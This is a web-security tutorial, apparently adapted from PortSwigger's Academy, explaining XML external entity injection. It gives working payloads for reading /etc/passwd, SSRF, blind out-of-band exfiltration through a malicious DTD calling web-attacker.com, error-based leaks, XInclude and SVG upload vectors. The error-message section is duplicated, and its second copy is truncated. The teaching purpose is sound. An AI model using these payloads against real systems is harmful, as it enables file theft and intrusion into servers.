# XML External entity (XXE) injection

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform [server-side request forgery](https://portswigger.net/web-security/ssrf) (SSRF) attacks.

Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.

XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.

### Exploiting XXE to retrieve files <a href="#exploiting-xxe-to-retrieve-files" id="exploiting-xxe-to-retrieve-files"></a>

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

* Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
* Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `productId` value. This causes the application's response to include the contents of the file.

{% hint style="info" %}
**Note**

With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.
{% endhint %}

### Exploiting XXE to perform SSRF attacks <a href="#exploiting-xxe-to-perform-ssrf-attacks" id="exploiting-xxe-to-perform-ssrf-attacks"></a>

Aside from retrieval of sensitive data, the other main impact of XXE attacks is that they can be used to perform server-side request forgery (SSRF). This is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.

To exploit an XXE vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf), you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform [blind SSRF](https://portswigger.net/web-security/ssrf/blind) attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

### Blind XXE vulnerabilities <a href="#blind-xxe-vulnerabilities" id="blind-xxe-vulnerabilities"></a>

Many instances of XXE vulnerabilities are blind. This means that the application does not return the values of any defined external entities in its responses, and so direct retrieval of server-side files is not possible.

Blind XXE vulnerabilities can still be detected and exploited, but more advanced techniques are required. You can sometimes use out-of-band techniques to find vulnerabilities and exploit them to exfiltrate data. And you can sometimes trigger XML parsing errors that lead to disclosure of sensitive data within error messages.

{% endhint %}

### Detecting blind XXE using out-of-band (OAST) techniques <a href="#detecting-blind-xxe-using-out-of-band-oast-techniques" id="detecting-blind-xxe-using-out-of-band-oast-techniques"></a>

You can often detect blind XXE using the same technique as for [XXE SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

```
<!ENTITY % myparameterentity "my parameter entity value" >
```

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

```
%myparameterentity;
```

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

### Exploiting blind XXE to exfiltrate data out-of-band <a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band" id="exploiting-blind-xxe-to-exfiltrate-data-out-of-band"></a>

Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD carries out the following steps:

* Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
* Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
* Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
* Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:

```
http://web-attacker.com/malicious.dtd
```

Finally, the attacker must submit the following XXE payload to the vulnerable application:

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the `/etc/passwd` file is transmitted to the attacker's server.

{% hint style="info" %}
**Note**

This technique might not work with some file contents, including the newline characters contained in the `/etc/passwd`file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead.
{% endhint %}

### Exploiting blind XXE to retrieve data via error messages <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages" id="exploiting-blind-xxe-to-retrieve-data-via-error-messages"></a>

An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

This DTD carries out the following steps:

* Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
* Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
* Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
* Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.

An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

This DTD carries out the following steps:

* Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.

* Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.

### Finding hidden attack surface for XXE injection <a href="#finding-hidden-attack-surface-for-xxe-injection" id="finding-hidden-attack-surface-for-xxe-injection"></a>

Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML.

#### XInclude attacks <a href="#xinclude-attacks" id="xinclude-attacks"></a>

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service.

In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document and so cannot define or modify a `DOCTYPE` element. However, you might be able to use `XInclude` instead. `XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an `XInclude` attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.

To perform an `XInclude` attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. For example:

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

#### XXE attacks via file upload <a href="#xxe-attacks-via-file-upload" id="xxe-attacks-via-file-upload"></a>

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

#### XXE attacks via modified content type <a href="#xxe-attacks-via-modified-content-type" id="xxe-attacks-via-modified-content-type"></a>

Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.

For example, if a normal request contains the following:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Then you might be able submit the following request, with the same result:

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.
